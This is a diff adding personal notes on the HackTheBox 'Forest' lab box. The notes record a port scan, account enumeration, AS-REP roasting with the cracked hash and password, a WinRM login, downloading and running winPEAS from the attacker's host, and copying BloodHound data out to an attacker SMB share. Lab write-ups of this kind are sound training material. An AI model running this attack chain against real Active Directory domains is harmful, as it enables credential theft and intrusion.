@@ -1,0 +1,62 @@
+forest
+
+	PORT      STATE SERVICE
+	88/tcp    open  kerberos-sec
+	135/tcp   open  msrpc
+	139/tcp   open  netbios-ssn
+		inaccesible
+	389/tcp   open  ldap
+		using enum4linux we find a bunch of plaintext-named accounts
+			lucinda
+			mark
+			sebastien
+			santi
+			svc-alfresco
+			andy
+			krbtgt
+		domain is called htb
+
+		impacket-GetNPUsers -request htb.local/ -dc-ip 10.10.10.161
+		returns a vulnerable service account. the hash can be cracked to get account's password
+		$krb5asrep$23$svc-alfresco@HTB.LOCAL:1e5af2cd5765f2bd70373c4c1baaa132$a96c29e378161f18d6c2be4fc40635ff7048c21dc0144ffdeb16d99495e3ac747968dbf1f9fbaed0ef2040e986e39418c37b0d059a58a8e9592341d01d0b53c600bc108109cf1012f92ae922dba77c71ad01ee4c4727c6610304d07cbb6f4db77c54224eaf54070f6e2d37da82c25165585ea49c39eb56e9d1635344fcf241ed8a02f250f37c09571d731a737142eb39c9b31a160098de1e27e2f1f6e7902de395d0730a8bee7c52e6cb9700de608e65cee7faa4f49f8ea4a862a8a0d0a309ac6cef68e8ae22c9c873ecfa1831495735f53a75b80aa271e22a1a85ced30bcfa4a5b5d293dfef
+
+		hashcat --help | grep -i kerberos
+			since we sent an auth request (as-req) and got a tgt (as-rep) - we're looking for as-rep type
+			18200 | Kerberos 5, etype 23, AS-REP
+
+		hashcat -O -m 18200 tgt.hash /usr/share/wordlists/rockyou.txt
+		the password is s3rvice
+
+		the box has winrm running
+		evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+		type ../Desktop/user.txt gives user flag
+
+		Invoke-WebRequest http://myip:8000/winPEASany.exe -OutFile winpeas.exe ; .\winpeas.exe
+			nothing interesting
+
+		running sharphound.exe -c all
+        impacket-smbserver kali .
+        copy 20240221102243_BloodHound.zip \\myip\kali
+
+		opening in bloodhound
+		
+		
+	445/tcp   open  microsoft-ds
+	464/tcp   open  kpasswd5
+	593/tcp   open  http-rpc-epmap
+	636/tcp   open  ldapssl
+	3268/tcp  open  globalcatLDAP
+	3269/tcp  open  globalcatLDAPssl
+	5985/tcp  open  wsman
+	9389/tcp  open  adws
+	47001/tcp open  winrm
+	49664/tcp open  unknown
+	49665/tcp open  unknown
+	49666/tcp open  unknown
+	49667/tcp open  unknown
+	49671/tcp open  unknown
+	49674/tcp open  unknown
+	49675/tcp open  unknown
+	49680/tcp open  unknown
+	49695/tcp open  unknown
+	49704/tcp open  unknown
